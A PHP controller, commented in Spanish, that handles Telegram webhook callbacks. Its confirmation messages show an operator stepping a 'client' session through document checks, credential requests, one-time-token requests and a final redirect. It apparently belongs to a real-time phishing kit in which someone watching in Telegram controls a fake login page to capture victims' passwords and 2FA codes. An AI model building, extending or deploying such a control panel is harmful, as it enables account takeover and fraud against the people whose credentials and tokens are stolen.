<?php

declare(strict_types=1);

namespace App\Controllers;

use App\Services\TelegramService;
use App\Services\LoggerService;
use App\Repositories\ActionRepository;
use App\Models\Action;

/**
 * Webhook Controller - Maneja webhooks de Telegram
 */
final class WebhookController
{
    public function __construct(
        private TelegramService $telegramService,
        private ActionRepository $actionRepository,
        private LoggerService $logger
    ) {
    }

    /**
     * Procesa callbacks de Telegram
     */
    public function handleCallback(array $update): void
    {
        if (!isset($update['callback_query'])) {
            http_response_code(200);
            return;
        }

        $callbackQuery = $update['callback_query'];
        $callbackData = $callbackQuery['data'];
        $callbackId = $callbackQuery['id'];
        $messageId = $callbackQuery['message']['message_id'];

        // Parse callback data: action:sessionId
        $parts = explode(':', $callbackData, 2);
        $action = $parts[0] ?? '';
        $sessionId = $parts[1] ?? '';

        if (empty($action) || empty($sessionId)) {
            http_response_code(200);
            return;
        }

        // Answer callback query inmediatamente
        $this->telegramService->answerCallbackQuery($callbackId);

        // Guardar acción
        $actionModel = new Action($action, time());
        $this->actionRepository->save($sessionId, $actionModel);

        // Eliminar botones del mensaje
        $this->telegramService->editMessageReplyMarkup($messageId, []);

        // Enviar confirmación
        $confirmations = [
            'error_documento' => '❌ Documento inválido → Recargando formulario',
            'pedir_logo' => '✅ Documento OK → Solicitando credenciales',
            'error_logo' => '❌ Credenciales incorrectas → Solicitando nuevamente',
            'pedir_token' => '🔑 Credenciales OK → Solicitando token',
            'finalizar' => '✅ Proceso completado → Cliente redireccionado',
        ];

        $confirmationMessage = $confirmations[$action] ?? 'Acción ejecutada';
        $this->telegramService->sendMessage($confirmationMessage, []);

        $this->logger->info('Telegram action processed', [
            'session_id' => $sessionId,
            'action' => $action,
        ]);

        http_response_code(200);
    }
}
